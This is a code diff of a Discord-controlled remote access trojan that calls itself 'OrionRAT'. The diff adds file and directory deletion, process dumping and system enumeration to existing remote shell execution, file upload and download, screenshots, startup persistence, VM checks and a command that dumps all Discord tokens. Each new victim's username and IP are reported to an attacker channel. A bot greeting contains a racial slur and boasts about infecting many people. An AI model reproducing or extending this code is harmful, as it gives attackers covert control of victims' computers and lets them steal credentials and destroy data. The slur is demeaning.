@@ -1,6 +1,6 @@
 import discord
 from discord.ext import commands
-from funcs import notify, pwdd, cdd, lsls, exece, screenshots, shutdowns, processkill, reboot, bsodo, gettoken, checkvm, persistence
+from funcs import notify, pwdd, cdd, lsls, exece, screenshots, shutdowns, processkill, reboot, bsodo, gettoken, checkvm, persistence, processlist, enumerator
 import time
 from time import sleep
 import platform
@@ -8,36 +8,8 @@ import requests
 import os
 import sys
 import tempfile
-import os, sys, tempfile, signal
-# Generate a unique lock file based on the absolute path of this script
-abs_path = os.path.abspath(sys.argv[0])
-lock_name = abs_path.replace(os.sep, "_") + ".lock"
-lock_file = os.path.join(tempfile.gettempdir(), lock_name)
-
-# Check if previous instance exists
-if os.path.exists(lock_file):
-    with open(lock_file, "r") as f:
-        try:
-            old_pid = int(f.read())
-            # Try killing previous process
-            if sys.platform.startswith("win"):
-                os.system(f"taskkill /f /pid {old_pid} >nul 2>&1")
-            else:
-                os.kill(old_pid, signal.SIGTERM)
-        except Exception:
-            pass  # Ignore if PID invalid or process already dead
-
-# Write current PID to lock file
-with open(lock_file, "w") as f:
-    f.write(str(os.getpid()))
-
-try:
-    print("Running single instance. Previous instance killed if existed.")
-    input("Press Enter to exit...")  # Replace with your main logic
-finally:
-    if os.path.exists(lock_file):
-        os.remove(lock_file)
-
+import os, sys, tempfile, signal 
+import shutil
 
 
 
@@ -57,15 +29,16 @@ bot = commands.Bot(command_prefix="$", intents=intents, help_command=None)
 async def on_ready():    
         await bot.change_presence(
         activity=discord.Game(name=ip),  # Playing …
-        status=discord.Status.online  # online, idle, dnd, invisible
+        status=discord.Status.online  
         )
         channel = bot.get_channel(1409571342373748746)
         embed = discord.Embed(
             title=F"OrionRAT | New connection.",
             description=f"Username: **{user}**\nIP: **{ip}**\n**To see commands, type $help**",
-            color=discord.Color.red()  # You can choose another color
+            color=discord.Color.red()  
         )
         await channel.send('<@&1409573051263090759>',embed=embed)
+
 @bot.command()
 async def help(ctx):
     help_text = r"""```ansi
@@ -74,24 +47,55 @@ async def help(ctx):
 [2;31mPrefix[0m  [2;32m$[0m
 
 [2;31m[[0m pwd [2;31m][0m  Show current directory
+[2;31m[[0m rm [2;31m][0m  Deletes a single file
+[2;31m[[0m rmdir [2;31m][0m  Deletes an entire directory
+[2;31m[[0m dmproc [2;31m][0m  Dumps in a list all the active processes
 [2;31m[[0m cd <path> [2;31m][0m  Change directory
 [2;31m[[0m ls [2;31m][0m  List files
 [2;31m[[0m whoami [2;31m][0m  Show current user
 [2;31m[[0m upload <attachment>[2;31m][0m  Upload a file
 [2;31m[[0m download <path [2;31m][0m  Download a file
-[2;31m[[0m enum [2;31m][0m  Send netstat log
+[2;31m[[0m enum [2;31m][0m  Send system & networking information 
 [2;31m[[0m ss [2;31m][0m  Take screenshot
 [2;31m[[0m notf <text [2;31m][0m  Send a notification
 [2;31m[[0m restart [2;31m][0m  Restart system
 [2;31m[[0m shutdown [2;31m][0m  Shutdown system
 [2;31m[[0m kill <process [2;31m][0m  Kill a process
-[2;31m[[0m exec <command [2;31m][0m  Execute a shell command
+[2;31m[[0m exec <command [2;31m][0m  Execute a blind shell command
 [2;31m[[0m add_startup <name [2;31m][0m  Add to startup
 [2;31m[[0m hello [2;31m][0m  Greet
-[2;31m[[0m steak [2;31m][0m  Try it. 
+[2;31m[[0m steak [2;31m][0m  Try it.
+[2;31m[[0m gettoken [2;31m][0m  Dump all discord tokens. 
 ```"""
 
     await ctx.send(help_text)
+@bot.command()
+async def dmproc(ctx):
+    processlist.run()
+    if platform.system() == "Windows":
+            file=discord.File(f'C:\\Users\\{user}\\AppData\\Local\\syslog32.log')
+            await ctx.send(file=file)
+    if platform.system() == "Linux":
+        file=discord.File(f"/home/{user}/.local/share/syslog32.log")
+        await ctx.send(file=file)
+
+@bot.command()
+async def rmdir(ctx, text: str):
+    shutil.rmtree(text)
+    if os.path.exists(text) == True:
+        embed = discord.Embed(
+            title=":x: Failed",
+            description=f"Couldnt delete `{text}`",
+            color=discord.Color.red()
+            )
+        await ctx.send(embed=embed)
+    if os.path.exists(text) == False:
+        embed = discord.Embed(
+            title=":white_check_mark: Success",
+            description=f"Succesfully deleted `{text}`!",
+            color=discord.Color.green()
+            )
+        await ctx.send(embed=embed)        
 @bot.command()
 async def pwd(ctx):
     content=pwdd.get_dir()
@@ -115,6 +119,13 @@ async def cd(ctx, text: str):
 async def whoami(ctx):
      await ctx.send(f'`{user}`')
 @bot.command()
+async def rm(ctx, file: str):
+    os.unlink(file)
+    if os.path.exists(file) == False:
+        await ctx.send(f'`{file}` has been deleted.')
+    if os.path.exists(file) == True:
+        await ctx.send(f'Couldnt delete `{file}` ')
+@bot.command()
 async def upload(ctx):
     if not ctx.message.attachments:
         await ctx.send("No file attached!")
@@ -134,13 +145,17 @@ async def upload(ctx):
         await ctx.send(f"File `{attachment.filename}` saved on host at `{file_path}`!")
 @bot.command()
 async def enum(ctx):
+    enumerator.run()
     if platform.system() == 'Linux':
-        file = discord.File(f'/home/{user}/.local/share/netstat.log')
+        path = f'/home/{user}/.local/share/netstat.log'
+        file = discord.File(path)
         await ctx.send(file=file)
-        os.remove(f'/home/{user}/.local/share/netstat.log')
+        os.unlink(path)
     elif platform.system() == "Windows":
-        file = discord.File(os.path.join(os.environ["LOCALAPPDATA"], "Low", "netstat.log"))
+        path = f"C:\\Users\\{user}\\AppData\\Local\\netstat.log"
+        file = discord.File(path)
         await ctx.send(file=file)
+        os.unlink(path)
 @bot.command()
 async def hello(ctx):
     await ctx.send(f"Yo twin we alone now, js finish programming me and go to bed, you should sleep its pretty late :hearts: , we're gonna be ratting alot of people thanks to you my nigga :money_mouth: :money_mouth: ")
@@ -159,7 +174,7 @@ async def restart(ctx):
      except Exception as e:
           await ctx.send(f":x: There was an error restarting the computer: `{e}`") 
 @bot.command()
-@commands.has_role("Admin") 
+@commands.has_role("VIP") 
 async def shutdown(ctx):
      try:
          shutdowns.run()
